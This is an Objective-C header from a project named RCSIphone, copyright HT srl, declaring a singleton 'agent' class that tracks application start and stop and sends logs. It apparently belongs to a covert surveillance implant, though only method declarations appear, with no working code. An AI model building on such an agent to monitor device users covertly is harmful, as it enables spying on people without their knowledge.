//
//  RCSIAgentApplication.h
//  RCSIphone
//
//  Created by kiodo on 12/3/10.
//  Copyright 2010 HT srl. All rights reserved.
//

#import <Foundation/Foundation.h>

//typedef __appStruct {
//  struct tm timestamp;
//  char *name;
//  char *status;
//  char *desc;
//  char *delim;
//} appStruct;

@interface RCSIAgentApplication : NSObject 
{
  BOOL      isAppStarted;
  NSString *mProcessName;
  NSString *mProcessDesc;
@private
  NSMutableDictionary *mAgentConfiguration;
}

@property (readwrite) BOOL isAppStarted;

+ (RCSIAgentApplication *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;
- (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus;
- (BOOL)grabInfo: (NSString*)aStatus;
- (void)sendStopLog;
- (void)sendStartLog;
- (void)start;
- (BOOL)stop;

@end
